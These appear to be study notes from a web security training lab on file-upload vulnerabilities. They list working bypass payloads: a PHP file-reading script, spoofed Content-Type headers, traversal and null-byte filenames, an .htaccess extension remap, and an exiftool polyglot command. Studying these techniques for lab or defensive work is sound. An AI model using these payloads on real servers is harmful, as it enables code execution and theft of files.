File Upload Vulnerabilities

Sometimes you need to try to prepare a file to run in order to output some intresting content

```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```
In some cases you need to change the content type 

```
Content-Type: application/x-php to "image/jpeg" or "image/png" to trick the security control
```
In other scenario you need to use directory trasversal to upload file and trick the control 
as shown below:

```
filename="exploit.php"
filename="../exploit.php" -> in this case the escape character is stripped by the back-end, 
therefore you need to URL encode it.
```
```
filename="%2e%2e%2fexploit.php" this will trick the back-end server and will allow you to have
the file available in the parent directory.
```


Another way is to Add another type of application for been executed by PHP
```
such as ".htaccess"
Here you set Content-Type: text/plain

in the content insert 
"AddType application/x-httpd-php .l33t"
```

This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module,
 it knows how to handle this already.

 Example below

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

After adding this file, you need to insert this new file with the new extension as shown below:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-httpd-php

<?php
echo file_get_contents('/home/carlos/secret');
?>
```

In other scenario, you can trick controls in the back-end system,
 uploading a the file extension followed by the null payload as follow:
```
 Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.png"
Content-Type: image/png

<?php
echo file_get_contents('/home/carlos/secret');
?>
```
Another way to trick the server is to use exiftool and write metadata into an
image

```
This is a command mockup "exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```




